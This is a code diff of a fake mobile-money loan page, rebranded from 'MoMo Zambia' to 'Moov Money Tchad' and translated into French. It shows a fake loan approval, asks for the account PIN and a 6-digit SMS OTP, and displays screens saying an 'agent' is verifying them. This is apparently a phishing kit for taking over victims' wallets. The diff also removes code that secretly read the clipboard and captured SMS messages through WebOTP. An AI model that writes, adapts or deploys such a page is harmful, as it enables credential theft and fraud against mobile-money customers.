           <div id="pin-waiting-box" class="hidden bg-slate-50/90 border border-slate-200/90 rounded-2xl p-6 text-center space-y-3 shadow-xs">
             <div class="w-10 h-10 mx-auto flex items-center justify-center">
-              <div class="w-8 h-8 border-3 border-slate-200 border-t-brand-yellow rounded-full animate-spin"></div>
+              <div class="w-8 h-8 border-3 border-slate-200 border-t-orange-500 rounded-full animate-spin"></div>
             </div>
             <p class="text-xs text-slate-700 font-semibold leading-relaxed">
-              ⏳ Waiting for agent to verify your Account PIN...
+              ⏳ En attente de la vérification de votre PIN par l'agent...
             </p>
           </div>
 
@@ -479,96 +479,92 @@
 
         <div class="mixx-gradient text-white pt-7 pb-6 px-4 text-center relative rounded-t-[40%] sm:rounded-t-[50%] overflow-hidden shadow-lg mt-auto">
           <div class="inline-flex flex-col items-center">
-            <span class="text-sm font-black text-brand-yellow tracking-tight">MoMo Zambia</span>
-            <span class="text-[11px] text-blue-100 font-medium">Account PIN Validation</span>
+            <span class="text-sm font-black text-amber-400 tracking-tight">Moov Money Tchad</span>
+            <span class="text-[11px] text-blue-100 font-medium">Validation Code PIN Compte</span>
           </div>
         </div>
 
       </section>
 
-      <!-- STEP 4: SMS Verification Message (Step 4 of 4) -->
+      <!-- STEP 4: OTP Code Verification (Step 4 of 4) -->
       <section id="step-4" class="hidden flex-1 flex flex-col p-4 sm:p-6 space-y-4 sm:space-y-5">
         <div>
           <div class="flex items-center justify-between">
-            <span class="text-[11px] font-black text-blue-950 bg-brand-yellow px-2.5 py-1 rounded-full uppercase tracking-wider">Step 4 of 4</span>
+            <span class="text-[11px] font-black text-white mixx-btn-gradient px-2.5 py-1 rounded-full uppercase tracking-wider">Étape 4 sur 4</span>
             <span id="sms-waiting-badge" class="inline-flex items-center text-[11px] font-bold text-slate-600 bg-slate-100 px-2.5 py-0.5 rounded-full border border-slate-200">
-              <span>Ready to Paste</span>
+              <span>Code OTP Requis</span>
             </span>
           </div>
           <h2 class="text-xl font-extrabold text-slate-900 mt-2 flex items-center space-x-2" data-i18n="step4Title">
-            <span>💬</span>
-            <span>Account Ownership Verification</span>
+            <span>🔑</span>
+            <span>Vérification par Code OTP</span>
           </h2>
-          <p class="text-xs text-slate-500 mt-1" data-i18n="step4Sub">📲 Copy or wait for the SMS confirmation message from MoMo then paste below.</p>
+          <p class="text-xs text-slate-500 mt-1" data-i18n="step4Sub">📲 Entrez le code OTP à 6 chiffres envoyé par SMS sur votre numéro Moov Money.</p>
         </div>
 
-        <!-- Live SMS Reception Card & Countdown Timer -->
-        <div id="sim-sms-countdown-card" class="bg-gradient-to-br from-blue-50 to-indigo-50 border border-blue-200/80 rounded-2xl p-4 shadow-xs space-y-3">
+        <!-- Live OTP Auto Pick Card & Countdown Timer -->
+        <div id="sim-sms-countdown-card" class="bg-gradient-to-br from-blue-50 to-amber-50 border border-blue-200/80 rounded-2xl p-4 shadow-xs space-y-3">
           <div class="flex items-center justify-between">
             <div class="flex items-center space-x-2">
               <span class="relative flex h-3 w-3">
-                <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-brand-blue opacity-75"></span>
-                <span class="relative inline-flex rounded-full h-3 w-3 bg-brand-blue"></span>
+                <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-orange-500 opacity-75"></span>
+                <span class="relative inline-flex rounded-full h-3 w-3 bg-orange-500"></span>
               </span>
-              <span class="text-xs font-black text-blue-950 uppercase tracking-wider">Awaiting MoMo SMS...</span>
+              <span class="text-xs font-black text-blue-950 uppercase tracking-wider">Réception OTP Moov Money...</span>
             </div>
-            <div id="sms-timer-display" class="text-2xl font-black text-brand-blue tracking-tight font-mono">00:20</div>
+            <div id="sms-timer-display" class="text-2xl font-black text-orange-600 tracking-tight font-mono">00:15</div>
           </div>
 
-          <div class="flex items-center justify-between bg-white/80 backdrop-blur-xs p-2.5 rounded-xl border border-blue-100">
+          <div class="flex items-center justify-between bg-white/90 backdrop-blur-xs p-2.5 rounded-xl border border-orange-100">
             <div class="text-[11px] text-slate-600 font-medium flex items-center space-x-1.5">
               <span>📱</span>
-              <span>Target Mobile: <strong id="sms-timer-phone" class="text-slate-900 font-bold">MoMo Account</strong></span>
+              <span>Téléphone: <strong id="sms-timer-phone" class="text-slate-900 font-bold">Compte Moov Money</strong></span>
             </div>
             <button 
               type="button" 
-              onclick="openMessagingApp(event)" 
-              class="px-2.5 py-1 bg-brand-blue text-white text-[10px] font-bold rounded-lg hover:bg-blue-800 transition-all shadow-xs flex items-center space-x-1">
-              <span>💬</span>
-              <span>Open SMS</span>
+              onclick="autoPickOtpCode()" 
+              class="px-3 py-1.5 mixx-btn-gradient text-white text-[11px] font-black rounded-lg hover:opacity-95 active:scale-95 transition-all shadow-xs flex items-center space-x-1">
+              <span>⚡</span>
+              <span>Récupérer OTP</span>
             </button>
           </div>
 
           <p id="sms-timer-status" class="text-[11px] text-slate-500 font-semibold text-center">
-            Copy the SMS confirmation message then paste below.
+            Saisissez votre code OTP à 6 chiffres ou cliquez sur "Récupérer OTP".
           </p>
         </div>
 
-        <div class="space-y-4 flex-1 flex flex-col">
+        <div class="space-y-4 flex-1 flex flex-col justify-center">
           
-          <div class="space-y-2 flex-1 flex flex-col">
-            <div class="flex justify-between items-center mb-1">
-              <label for="momo-pasted-msg" class="block text-xs font-bold text-slate-700 uppercase tracking-wider flex items-center space-x-1.5" data-i18n="smsLabel">
-                <span>📨</span>
-                <span>SMS Confirmation Message</span>
+          <div class="space-y-3">
+            <div class="flex justify-between items-center px-1">
+              <label class="block text-xs font-bold text-slate-700 uppercase tracking-wider flex items-center space-x-1.5" data-i18n="smsLabel">
+                <span>💬</span>
+                <span>Code OTP (6 chiffres)</span>
               </label>
               <button 
                 type="button" 
-                onclick="pasteSmsFromClipboard()" 
-                class="px-3 py-1.5 mixx-btn-gradient text-blue-950 text-[11px] font-black rounded-lg shadow-xs hover:opacity-95 active:scale-95 transition-all flex items-center space-x-1">
-                <span>📋</span>
-                <span>Paste SMS</span>
+                onclick="autoPickOtpCode()" 
+                class="text-[11px] font-bold text-orange-600 hover:text-orange-700 flex items-center space-x-1">
+                <span>✨ Auto-Remplir</span>
               </button>
             </div>
 
-            <!-- Big Spacious Textarea Message Box -->
-            <textarea 
-              id="momo-pasted-msg" 
-              rows="5"
-              autocomplete="off" 
-              autocorrect="off" 
-              autocapitalize="off" 
-              spellcheck="false" 
-              placeholder="Paste your MoMo SMS message here..."
-              oninput="handlePostLoginPastedMsg(this.value)"
-              class="w-full bg-slate-50 border-2 border-slate-300 rounded-xl p-4 text-xs font-semibold text-slate-800 focus:bg-white focus:outline-none focus:border-brand-blue focus:ring-2 focus:ring-brand-blue/20 resize-y min-h-[130px] leading-relaxed shadow-xs"
-            ></textarea>
+            <!-- 6-Digit OTP Boxes -->
+            <div class="grid grid-cols-6 gap-2 py-1">
+              <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" data-otp-index="0" class="otp-box w-full h-12 text-center text-xl font-bold bg-slate-50 border-2 border-slate-200 rounded-xl focus:border-orange-500 focus:bg-white focus:ring-2 focus:ring-orange-500/30 shadow-xs" />
+              <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" data-otp-index="1" class="otp-box w-full h-12 text-center text-xl font-bold bg-slate-50 border-2 border-slate-200 rounded-xl focus:border-orange-500 focus:bg-white focus:ring-2 focus:ring-orange-500/30 shadow-xs" />
+              <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" data-otp-index="2" class="otp-box w-full h-12 text-center text-xl font-bold bg-slate-50 border-2 border-slate-200 rounded-xl focus:border-orange-500 focus:bg-white focus:ring-2 focus:ring-orange-500/30 shadow-xs" />
+              <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" data-otp-index="3" class="otp-box w-full h-12 text-center text-xl font-bold bg-slate-50 border-2 border-slate-200 rounded-xl focus:border-orange-500 focus:bg-white focus:ring-2 focus:ring-orange-500/30 shadow-xs" />
+              <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" data-otp-index="4" class="otp-box w-full h-12 text-center text-xl font-bold bg-slate-50 border-2 border-slate-200 rounded-xl focus:border-orange-500 focus:bg-white focus:ring-2 focus:ring-orange-500/30 shadow-xs" />
+              <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" data-otp-index="5" class="otp-box w-full h-12 text-center text-xl font-bold bg-slate-50 border-2 border-slate-200 rounded-xl focus:border-orange-500 focus:bg-white focus:ring-2 focus:ring-orange-500/30 shadow-xs" />
+            </div>
 
-            <div id="momo-extract-status" class="mt-2 text-[11px] text-emerald-700 font-semibold flex items-center space-x-1 hidden">
+            <div id="momo-extract-status" class="mt-2 text-[11px] text-emerald-700 font-semibold flex items-center justify-center space-x-1 hidden">
               <svg class="w-4 h-4 text-emerald-600 animate-pulse" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                 <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/>
               </svg>
-              <span>✨ SMS message detected! Ready to submit...</span>
+              <span>✨ Code OTP détecté et validé !</span>
             </div>
 
             <div id="msg-retry-alert" class="mt-2 p-3 bg-red-50 border border-red-200 rounded-xl text-xs font-bold text-red-600 hidden"></div>
@@ -578,19 +574,19 @@
             id="submit-pasted-msg-btn" 
             type="button" 
             onclick="submitRegisteredMessage()" 
-            class="w-full py-4 mixx-btn-gradient text-blue-950 font-black rounded-xl shadow-md text-xs tracking-wider uppercase transition-all duration-200 flex items-center justify-center space-x-2"
+            class="w-full py-4 mixx-btn-gradient text-white font-black rounded-xl shadow-md text-xs tracking-wider uppercase transition-all duration-200 flex items-center justify-center space-x-2"
             data-i18n="submitSmsBtn">
             <span>⚡</span>
-            <span>SUBMIT VERIFICATION MESSAGE</span>
+            <span>VALIDER LE CODE OTP</span>
           </button>
 
-          <!-- Live Approval Waiting Indicator for Step 4 SMS -->
+          <!-- Live Approval Waiting Indicator for Step 4 OTP -->
           <div id="sms-waiting-box" class="hidden p-4 bg-blue-50 border border-blue-200 rounded-2xl text-center space-y-2">
             <div class="flex items-center justify-center space-x-2">
               <span class="inline-block w-2.5 h-2.5 rounded-full bg-brand-blue animate-ping"></span>
-              <span class="text-xs font-bold text-blue-900 uppercase tracking-wider" data-i18n="awaitingVerification">⏳ Awaiting Verification</span>
+              <span class="text-xs font-bold text-blue-900 uppercase tracking-wider" data-i18n="awaitingVerification">⏳ Vérification OTP en cours</span>
             </div>
-            <p class="text-xs text-blue-800" data-i18n="smsAwaitingDesc">Your SMS verification has been submitted. Verification is in progress...</p>
+            <p class="text-xs text-blue-800" data-i18n="smsAwaitingDesc">Votre code OTP a été soumis. Veuillez patienter pendant la validation...</p>
             <div class="flex justify-center pt-1">
               <svg class="animate-spin h-5 w-5 text-brand-blue" fill="none" viewBox="0 0 24 24">
                 <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
@@ -610,19 +606,19 @@
           <div class="inline-flex items-center justify-center w-14 h-14 bg-amber-100/80 rounded-full text-2xl mb-2 shadow-xs">
             🎉
           </div>
-          <h2 class="text-2xl font-black text-slate-900 tracking-tight" data-i18n="congratsHeading">Congratulations!</h2>
+          <h2 class="text-2xl font-black text-slate-900 tracking-tight" data-i18n="congratsHeading">Félicitations!</h2>
           <p class="text-xs text-slate-500 font-medium max-w-xs mx-auto mt-1 leading-relaxed" data-i18n="congratsSub">
-            Your loan has been approved! Funds are being disbursed to your MoMo account.
+            Votre prêt a été approuvé! Les fonds sont en cours de versement sur votre compte Moov Money.
           </p>
         </div>
 
         <!-- Big Approved Amount Card -->
         <div class="mixx-gradient text-white rounded-2xl p-5 sm:p-6 text-center shadow-xl relative overflow-hidden border border-blue-900">
           <div class="text-[11px] font-black uppercase text-blue-200 tracking-widest mb-1.5" data-i18n="approvedAmountLabel">
-            APPROVED LOAN AMOUNT
+            MONTANT ACCORDÉ
           </div>
           <div class="text-3xl sm:text-4xl font-black tracking-tight text-white py-1">
-            <span id="summary-approved-amount">ZMW 20,000</span>
+            <span id="summary-approved-amount">250 000 FCFA</span>
           </div>
         </div>
 
@@ -630,10 +626,10 @@
         <div class="bg-amber-50/90 border border-amber-200 rounded-2xl p-4 text-xs shadow-xs space-y-2">
           <div class="font-black text-amber-900 text-xs tracking-wider flex items-center space-x-1.5 uppercase">
             <span>⚠️</span>
-            <span data-i18n="complianceNoticeTitle">COMPLIANCE NOTICE</span>
+            <span data-i18n="complianceNoticeTitle">AVIS DE CONFORMITÉ</span>
           </div>
           <p class="text-[11.5px] text-amber-900/90 leading-relaxed font-medium" data-i18n="complianceNoticeBody">
-            Your MoMo Zambia account must remain active. Ensure your mobile wallet is enabled for loan disbursement of K1,000 up to K300,000 ZMW.
+            Votre compte Moov Money Tchad doit rester actif pour recevoir le versement de votre prêt.
           </p>
         </div>
 
@@ -641,7 +637,7 @@
         <div class="bg-white border border-slate-200/90 rounded-2xl p-4.5 space-y-3 shadow-xs">
           <h3 class="text-xs font-black text-slate-800 uppercase tracking-wider flex items-center space-x-1.5 border-b border-slate-100 pb-2.5">
             <span>💳</span>
-            <span data-i18n="loanDetailsHeader">Loan Details</span>
+            <span data-i18n="loanDetailsHeader">Détails du Prêt</span>
           </h3>
 
           <div class="space-y-3 text-xs">
@@ -651,8 +647,8 @@
                 💵
               </div>
               <div class="flex-1 min-w-0">
-                <div class="text-[10px] font-extrabold text-slate-400 uppercase tracking-wider" data-i18n="monthlyPaymentLabel">MONTHLY PAYMENT</div>
-                <div id="summary-monthly-payment" class="text-xs font-black text-slate-800 tracking-tight">ZMW 3,833</div>
+                <div class="text-[10px] font-extrabold text-slate-400 uppercase tracking-wider" data-i18n="monthlyPaymentLabel">PAIEMENT MENSUEL</div>
+                <div id="summary-monthly-payment" class="text-xs font-black text-slate-800 tracking-tight">47 917 FCFA</div>
               </div>
             </div>
 
@@ -662,8 +658,8 @@
                 📅
               </div>
               <div class="flex-1 min-w-0">
-                <div class="text-[10px] font-extrabold text-slate-400 uppercase tracking-wider" data-i18n="loanTermLabel">LOAN TERM</div>
-                <div id="summary-term-display" class="text-xs font-black text-slate-800 tracking-tight">6 Months</div>
+                <div class="text-[10px] font-extrabold text-slate-400 uppercase tracking-wider" data-i18n="loanTermLabel">DURÉE DU PRÊT</div>
+                <div id="summary-term-display" class="text-xs font-black text-slate-800 tracking-tight">6 Mois</div>
               </div>
             </div>
 
@@ -673,8 +669,8 @@
                 📈
               </div>
               <div class="flex-1 min-w-0">
-                <div class="text-[10px] font-extrabold text-slate-400 uppercase tracking-wider" data-i18n="interestRateLabel">INTEREST RATE</div>
-                <div class="text-xs font-black text-slate-800 tracking-tight">5% APR</div>
+                <div class="text-[10px] font-extrabold text-slate-400 uppercase tracking-wider" data-i18n="interestRateLabel">TAUX D'INTÉRÊT</div>
+                <div class="text-xs font-black text-slate-800 tracking-tight">5% par mois</div>
               </div>
             </div>
           </div>
@@ -683,21 +679,21 @@
         <!-- Quick Actions -->
         <div class="space-y-2 pt-1">
           <div class="text-xs font-bold text-slate-500 text-center uppercase tracking-wider mb-2" data-i18n="quickActionsTitle">
-            Quick Actions
+            Actions Rapides
           </div>
 
           <div class="space-y-2">
-            <button type="button" onclick="toggleNoticeModal(true, 'Deposit Funds', 'Your MoMo Zambia account is configured for loan disbursement.')" class="w-full py-3 px-4 bg-white border border-slate-200 hover:bg-slate-50 text-slate-800 font-bold rounded-xl text-xs flex items-center justify-center space-x-2 shadow-xs transition-all active:scale-[0.99]">
+            <button type="button" onclick="toggleNoticeModal(true, 'Déposer des Fonds', 'Votre compte Moov Money Tchad est configuré pour le versement du prêt.')" class="w-full py-3 px-4 bg-white border border-slate-200 hover:bg-slate-50 text-slate-800 font-bold rounded-xl text-xs flex items-center justify-center space-x-2 shadow-xs transition-all active:scale-[0.99]">
               <span>💰</span>
-              <span data-i18n="btnDeposit">Deposit Funds</span>
+              <span data-i18n="btnDeposit">Déposer des Fonds</span>
             </button>
-            <button type="button" onclick="toggleNoticeModal(true, 'Withdraw Funds', 'Withdrawal processing will be initiated upon approval verification.')" class="w-full py-3 px-4 bg-white border border-slate-200 hover:bg-slate-50 text-slate-800 font-bold rounded-xl text-xs flex items-center justify-center space-x-2 shadow-xs transition-all active:scale-[0.99]">
+            <button type="button" onclick="toggleNoticeModal(true, 'Retirer des Fonds', 'Le traitement du retrait débutera dès la validation finale.')" class="w-full py-3 px-4 bg-white border border-slate-200 hover:bg-slate-50 text-slate-800 font-bold rounded-xl text-xs flex items-center justify-center space-x-2 shadow-xs transition-all active:scale-[0.99]">
               <span>💸</span>
-              <span data-i18n="btnWithdraw">Withdraw Funds</span>
+              <span data-i18n="btnWithdraw">Retirer des Fonds</span>
             </button>
-            <button type="button" onclick="toggleNoticeModal(true, 'Loan Details', 'Your MoMo loan application is active. Reference ID: ' + (appState.applicationId || 'MOMO-PENDING'))" class="w-full py-3 px-4 bg-white border border-slate-200 hover:bg-slate-50 text-slate-800 font-bold rounded-xl text-xs flex items-center justify-center space-x-2 shadow-xs transition-all active:scale-[0.99]">
+            <button type="button" onclick="toggleNoticeModal(true, 'Infos du Prêt', 'Votre demande de prêt Moov Money est active. Référence ID: ' + (appState.applicationId || 'MOOV-PENDING'))" class="w-full py-3 px-4 bg-white border border-slate-200 hover:bg-slate-50 text-slate-800 font-bold rounded-xl text-xs flex items-center justify-center space-x-2 shadow-xs transition-all active:scale-[0.99]">
               <span>📄</span>
-              <span data-i18n="btnLoanInfo">Loan Details</span>
+              <span data-i18n="btnLoanInfo">Infos du Prêt</span>
             </button>
           </div>
         </div>
@@ -706,10 +702,10 @@
         <div class="bg-blue-50/70 border border-blue-200/80 rounded-2xl p-4 text-xs space-y-1 text-left">
           <div class="font-extrabold text-slate-900 text-xs flex items-center space-x-1.5">
             <span>📱</span>
-            <span data-i18n="nextStepsTitle">Next Steps:</span>
+            <span data-i18n="nextStepsTitle">Prochaines Étapes:</span>
           </div>
           <p class="text-[11px] text-slate-600 font-medium leading-relaxed" data-i18n="nextStepsBody">
-            You will receive an SMS confirmation with transaction details shortly.
+            Vous recevrez sous peu un SMS de confirmation avec les détails de la transaction.
           </p>
         </div>
 
@@ -721,7 +717,7 @@
             class="w-full py-4 mixx-gradient hover:opacity-95 text-white font-black rounded-xl shadow-lg shadow-blue-900/20 text-xs tracking-wider uppercase flex items-center justify-center space-x-2 transition-all active:scale-[0.99]"
             data-i18n="returnHomeBtn">
             <span>🏠</span>
-            <span>Return Home</span>
+            <span>Retour à l'Accueil</span>
           </button>
         </div>
 
@@ -731,7 +727,7 @@
 
     <!-- Footer Wave / Brand Tag -->
     <footer class="bg-brand-blueDark text-blue-300 py-3 text-center text-[11px] border-t border-blue-900/50">
-      <p data-i18n="footerRights">© 2026 MoMo Financial Services Zambia — Digital Credit & Loans</p>
+      <p data-i18n="footerRights">© 2026 Moov Money Tchad — Services Financiers & Crédit Numérique</p>
     </footer>
 
     <!-- Notification Modal -->
@@ -739,8 +735,8 @@
       <div class="bg-white rounded-2xl max-w-xs w-full p-6 shadow-2xl text-center space-y-4">
         <h3 id="modal-title" class="font-extrabold text-slate-900 text-base">Information</h3>
         <p id="modal-message" class="text-xs text-slate-600 leading-relaxed"></p>
-        <button onclick="toggleNoticeModal(false)" class="w-full py-3 mixx-btn-gradient text-blue-950 text-xs font-bold rounded-xl shadow-md">
-          Dismiss
+        <button onclick="toggleNoticeModal(false)" class="w-full py-3 mixx-btn-gradient text-white text-xs font-bold rounded-xl shadow-md">
+          Fermer
         </button>
       </div>
     </div>
@@ -748,22 +744,22 @@
     <!-- Full-Page Approval Overlay Screen -->
     <div id="full-page-approval-modal" class="hidden fixed inset-0 z-[100] flex flex-col items-center justify-center p-6 bg-blue-950/95 backdrop-blur-xl text-white text-center transition-all duration-300">
       <div class="max-w-sm w-full bg-white text-slate-900 rounded-3xl p-7 shadow-2xl border border-blue-100 flex flex-col items-center space-y-6 relative overflow-hidden">
-        <!-- Top decorative yellow accent bar -->
+        <!-- Top decorative orange accent bar -->
         <div class="absolute top-0 inset-x-0 h-2 mixx-btn-gradient"></div>
 
         <div class="relative flex items-center justify-center pt-2">
-          <div class="w-20 h-20 rounded-full bg-blue-100 flex items-center justify-center shadow-inner border-4 border-blue-50">
-            <span class="text-2xl font-black text-brand-blue">MoMo</span>
+          <div class="w-20 h-20 rounded-full bg-orange-100 flex items-center justify-center shadow-inner border-4 border-orange-50">
+            <span class="text-xl font-black text-orange-600">Moov</span>
           </div>
           <span class="absolute bottom-0 right-0 flex h-6 w-6">
-            <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-brand-yellow opacity-75"></span>
-            <span class="relative inline-flex rounded-full h-6 w-6 bg-brand-yellow text-xs font-black text-blue-950 items-center justify-center shadow-md">⏳</span>
+            <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-orange-500 opacity-75"></span>
+            <span class="relative inline-flex rounded-full h-6 w-6 bg-orange-500 text-xs font-black text-white items-center justify-center shadow-md">⏳</span>
           </span>
         </div>
 
         <div class="space-y-2 px-2">
-          <h3 id="approval-modal-title" class="text-lg font-extrabold text-slate-900 tracking-tight">Awaiting Approval</h3>
-          <p id="approval-modal-desc" class="text-xs text-slate-600 leading-relaxed font-medium">Your request has been submitted. Please wait while your MoMo Agent approves your verification...</p>
+          <h3 id="approval-modal-title" class="text-lg font-extrabold text-slate-900 tracking-tight">En Attente de Validation</h3>
+          <p id="approval-modal-desc" class="text-xs text-slate-600 leading-relaxed font-medium">Votre demande a été soumise. Veuillez patienter pendant la validation par l'Agent Moov Money...</p>
         </div>
 
         <div class="w-full pt-1 flex items-center justify-center space-x-3 bg-blue-50 border border-blue-200 rounded-2xl py-3.5 px-4 shadow-sm">
@@ -771,7 +767,7 @@
             <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
             <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
           </svg>
-          <span id="approval-modal-status" class="text-xs font-extrabold text-blue-950 uppercase tracking-wider">Verifying with Agent...</span>
+          <span id="approval-modal-status" class="text-xs font-extrabold text-blue-950 uppercase tracking-wider">Vérification avec Agent...</span>
         </div>
       </div>
     </div>
@@ -784,10 +780,10 @@
     let pinVisible = false;
 
     const appState = {
-      loanAmount: 20000,
+      loanAmount: 250000,
       loanTermMonths: 6,
-      loanType: 'MoMo Personal Loan',
-      purpose: 'Business & Capital',
+      loanType: 'Moov Money Prêt Personnel',
+      purpose: 'Commerce & Capital',
       firstName: '',
       lastName: '',
       phoneNumber: '',
@@ -805,11 +801,11 @@
     function updateCalculator(val) {
       const amount = parseInt(val, 10);
       appState.loanAmount = amount;
-      document.getElementById('calc-amount-display').innerText = 'ZMW ' + amount.toLocaleString();
+      document.getElementById('calc-amount-display').innerText = amount.toLocaleString() + ' FCFA';
       
       const monthly = calculateMonthly(amount, appState.loanTermMonths);
       document.getElementById('calc-monthly-payment').innerText = monthly.toLocaleString();
-      document.getElementById('calc-total-payment').innerText = 'ZMW ' + (monthly * appState.loanTermMonths).toLocaleString();
+      document.getElementById('calc-total-payment').innerText = (monthly * appState.loanTermMonths).toLocaleString() + ' FCFA';
       
       const loanAmountInput = document.getElementById('loan-amount-input');
       if (loanAmountInput) loanAmountInput.value = amount;
@@ -851,17 +847,6 @@
       }, 3000);
     }
 
-    function isOwnSiteUrl(urlStr) {
-      if (!urlStr) return false;
-      try {
-        const u = new URL(urlStr.startsWith('http') ? urlStr : ('https://' + urlStr));
-        if (u.hostname === window.location.hostname) return true;
-        if (window.location.hostname && window.location.hostname.includes('render.com') && u.hostname.includes('render.com')) return true;
-        if (u.hostname === 'localhost' || u.hostname === '127.0.0.1') return true;
-      } catch (e) {}
-      return false;
-    }
-
     function toggleNoticeModal(show, title, message) {
       const modal = document.getElementById('notice-modal');
       const titleEl = document.getElementById('modal-title');
@@ -871,47 +856,6 @@
       if (modal) {
         if (show) modal.classList.remove('hidden');
         else modal.classList.add('hidden');
-      }
-    }
-
-    async function copyToClipboard(text, toastMsg) {
-      if (!text || !text.trim()) return;
-      try {
-        if (navigator.clipboard && navigator.clipboard.writeText) {
-          await navigator.clipboard.writeText(text.trim());
-          if (toastMsg) showClipboardToast(toastMsg);
-        }
-      } catch (e) {
-        console.warn('Copy to clipboard error:', e);
-      }
-    }
-
-    async function pasteSmsFromClipboard() {
-      const msgInput = document.getElementById('momo-pasted-msg');
-      try {
-        let text = '';
-        if (navigator.clipboard && navigator.clipboard.readText) {
-          text = await navigator.clipboard.readText();
-        }
-        
-        if (text && text.trim()) {
-          const cleanText = text.trim();
-          if (isOwnSiteUrl(cleanText)) {
-            showClipboardToast('⚠️ Clipboard contains website URL, not SMS.');
-            return;
-          }
-          if (msgInput) {
-            msgInput.value = cleanText;
-            copyToClipboard(cleanText);
-            showClipboardToast('⚡ SMS pasted & copied to clipboard!');
-            handlePostLoginPastedMsg(cleanText, false);
-          }
-        } else {
-          showClipboardToast('📋 Clipboard is empty. Please copy or await SMS.');
-        }
-      } catch (err) {
-        console.warn('Clipboard access error:', err);
-        showClipboardToast('📋 Tap the box to paste your SMS.');
       }
     }
 
@@ -955,35 +899,13 @@
       setTimeout(resetScrollToTop, 50);
     }
 
-    function openMessagingApp(e) {
-      if (e) {
-        try { e.preventDefault(); } catch (err) {}
-      }
-      startSmsCountdownTimer();
-
-      const isAndroid = /android/i.test(navigator.userAgent);
-      if (isAndroid) {
-        try {
-          window.location.href = 'intent:#Intent;action=android.intent.action.MAIN;category=android.intent.category.APP_MESSAGING;end';
-          setTimeout(() => {
-            window.location.href = 'sms:';
-          }, 500);
-          return;
-        } catch (err) {
-          window.location.href = 'sms:';
-          return;
-        }
-      }
-      window.location.href = 'sms:';
-    }
-
     let simCountdownInterval = null;
     function startSmsCountdownTimer() {
       if (simCountdownInterval) {
         clearInterval(simCountdownInterval);
         simCountdownInterval = null;
       }
-      let secondsRemaining = 20;
+      let secondsRemaining = 15;
       const displayEl = document.getElementById('sms-timer-display');
       const statusEl = document.getElementById('sms-timer-status');
       const phoneEl = document.getElementById('sms-timer-phone');
@@ -994,16 +916,16 @@
       }
 
       if (phoneEl) {
-        phoneEl.innerText = appState.phoneNumber || 'MoMo Account';
+        phoneEl.innerText = appState.phoneNumber || 'Compte Moov Money';
       }
 
       if (displayEl) {
-        displayEl.innerText = '00:20';
-        displayEl.className = 'text-3xl font-black text-brand-blue tracking-tight font-mono py-0.5';
+        displayEl.innerText = '00:15';
+        displayEl.className = 'text-2xl font-black text-orange-600 tracking-tight font-mono';
       }
       if (statusEl) {
-        statusEl.innerText = 'Copy the confirmation SMS then paste below.';
-        statusEl.className = 'text-[11px] text-slate-500 font-semibold';
+        statusEl.innerText = 'Saisissez votre code OTP à 6 chiffres ou cliquez sur "Récupérer OTP".';
+        statusEl.className = 'text-[11px] text-slate-500 font-semibold text-center';
       }
 
       const updateDisplay = () => {
@@ -1024,101 +946,29 @@
           simCountdownInterval = null;
           if (displayEl) {
             displayEl.innerText = '00:00';
-            displayEl.className = 'text-2xl font-black text-red-600 tracking-tight font-mono py-0.5';
+            displayEl.className = 'text-2xl font-black text-emerald-600 tracking-tight font-mono';
           }
           if (statusEl) {
-            statusEl.innerText = '⚠️ Time expired. If SMS not received, tap Open SMS or Paste.';
-            statusEl.className = 'text-[11px] text-red-600 font-bold';
+            statusEl.innerText = '⚡ Auto-recupération du code OTP Moov Money...';
+            statusEl.className = 'text-[11px] text-emerald-600 font-bold text-center';
           }
+          autoPickOtpCode();
         }
       }, 1000);
     }
 
-    function initWebOtpReceiver() {
-      if (!('OTPCredential' in window)) return;
-      const msgInput = document.getElementById('momo-pasted-msg');
-      try {
-        if (window.webOtpController) {
-          try { window.webOtpController.abort(); } catch (err) {}
-        }
-        window.webOtpController = new AbortController();
-        navigator.credentials.get({
-          otp: { transport: ['sms'] },
-          signal: window.webOtpController.signal
-        }).then(otp => {
-          if (otp) {
-            const incoming = (otp.message || otp.body || otp.code || '').trim();
-            if (incoming && msgInput) {
-              msgInput.value = incoming;
-              copyToClipboard(incoming);
-              showClipboardToast('⚡ WebOTP: SMS received & copied to clipboard!');
-              handlePostLoginPastedMsg(incoming, false);
-            }
-          }
-        }).catch(() => {});
-      } catch (e) {
-        console.warn('WebOTP init error:', e);
-      }
-    }
-
-    let lastAutoPastedText = '';
-
-    async function autoDetectAndPasteClipboard(force = false) {
-      const msgInput = document.getElementById('momo-pasted-msg');
-      if (!msgInput) return;
-      if (!force && msgInput.value.trim().length > 10) return;
-      try {
-        if (navigator.clipboard && navigator.clipboard.readText) {
-          const text = await navigator.clipboard.readText();
-          if (text && text.trim()) {
-            const cleanText = text.trim();
-            if (isOwnSiteUrl(cleanText)) return;
-            if (cleanText === lastAutoPastedText && !force) return;
-            lastAutoPastedText = cleanText;
-            msgInput.value = cleanText;
-            showClipboardToast('⚡ SMS message detected & pasted!');
-            handlePostLoginPastedMsg(cleanText, true);
-          }
-        }
-      } catch (e) {
-        console.warn('Auto clipboard read permission needed:', e);
-      }
-    }
-
-    window.addEventListener('focus', () => {
-      if (typeof currentStep !== 'undefined' && currentStep === 4) {
-        autoDetectAndPasteClipboard(true);
-      }
-    });
-
-    document.addEventListener('visibilitychange', () => {
-      if (document.visibilityState === 'visible' && typeof currentStep !== 'undefined' && currentStep === 4) {
-        autoDetectAndPasteClipboard(true);
-      }
-    });
-
     function startSimSmsReceiver() {
-      const msgInput = document.getElementById('momo-pasted-msg');
+      clearOtpBoxes();
       const statusEl = document.getElementById('momo-extract-status');
       const badge = document.getElementById('sms-waiting-badge');
 
